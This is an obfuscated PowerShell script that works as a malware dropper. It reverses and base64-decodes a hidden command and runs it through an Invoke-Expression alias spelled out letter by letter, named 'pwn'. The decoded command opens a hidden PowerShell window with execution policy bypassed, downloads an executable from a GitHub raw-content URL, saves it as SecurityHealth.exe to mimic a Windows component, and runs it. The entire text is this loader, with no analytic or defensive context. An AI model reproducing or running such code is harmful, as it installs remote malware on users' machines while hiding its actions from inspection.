$best64code = "K0gCNUGel5Ca0xWYlhUe0lmc1NWZTx1YpxmY1BFXzJXZzVFX6MEIuVGZklGSgcXLgUGel5CbsVGazJXZ39GcK0QZ4VmLoRHbhVGS5RXayV3YlNFXjlGbiVHUcNnclNXVcpzQg8WLgUGel5Ca0xWYlhUe0lmc1NWZT9ibpFWbvMHZh9Gb5FGUvATOlRWdy9SbvNmL05WZ052bjJXZzVnY1hGdpdmL3Fmcv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39Gc/u77" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$lOAdCode = [SYSteM.text.EnCoDING]::UTF8.GETStriNG([sYsTeM.CONvERt]::FrOMbAse64sTRINg("$BasE64")) ;
$PWN = "I"+"n"+"v"+"O"+"K"+"e"+"-"+"e"+"X"+"P"+"R"+"e"+"s"+"S"+"I"+"o"+"n" ; neW-aLIas -NAME pWN -VALUe $PWN -FOrcE ; pwn $LoadCode ;
